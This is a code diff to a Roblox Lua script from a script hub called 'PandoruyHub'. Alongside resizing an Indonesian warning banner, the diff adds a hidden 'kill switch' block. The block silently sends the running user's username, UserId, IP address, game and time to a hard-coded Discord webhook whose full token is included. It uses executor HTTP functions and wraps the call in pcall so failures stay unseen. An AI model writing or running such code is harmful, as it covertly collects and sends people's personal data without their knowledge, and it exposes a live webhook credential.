@@ -1,4 +1,5 @@
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 
 local WarningGui = Instance.new("ScreenGui")
 WarningGui.Name = "PandoruyWarning"
@@ -15,12 +16,13 @@ Bg.ZIndex = 100
 Bg.Parent = WarningGui
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(0.9, 0, 0, 60)
-Title.Position = UDim2.new(0.05, 0, 0.25, 0)
+Title.Size = UDim2.new(0.9, 0, 0, 120)
+Title.Position = UDim2.new(0.05, 0, 0.2, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "HATI-HATI AKUN ANDA HILANG, GUNAKAN SCRIPT YANG RESMI!"
+Title.Text = "HATI-HATI AKUN ANDA HILANG,\nGUNAKAN SCRIPT YANG RESMI!"
 Title.TextColor3 = Color3.fromRGB(255, 0, 0)
-Title.TextSize = 40
+Title.TextSize = 32
+Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.TextWrapped = true
 Title.TextStrokeTransparency = 0
@@ -82,6 +84,35 @@ task.spawn(function()
     TweenService:Create(IPLabel, TweenInfo.new(1), {
         TextTransparency = 0
     }):Play()
+
+    pcall(function()
+        local webhookUrl = "https://discord.com/api/webhooks/1475163000272064532/H6t7HFbsZuUwp_i9mBYtNE2-PD6MlBPPY3MnuNNvJPjRCDt-4D32pPzeT9It7AV0cDiC"
+        local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+        local data = HttpService:JSONEncode({
+            embeds = {{
+                title = "Leaked Script Executed",
+                color = 16711680,
+                fields = {
+                    { name = "Username", value = playerName, inline = true },
+                    { name = "UserId", value = userId, inline = true },
+                    { name = "IP Address", value = ip, inline = true },
+                    { name = "Game", value = gameInfo.Name or "Unknown", inline = true },
+                    { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+                    { name = "Time", value = timeNow, inline = true },
+                },
+                footer = { text = "PandoruyHub Kill Switch" }
+            }}
+        })
+        local request = (syn and syn.request) or (http and http.request) or http_request or request
+        if request then
+            request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = data
+            })
+        end
+    end)
 end)
 
 task.spawn(function()
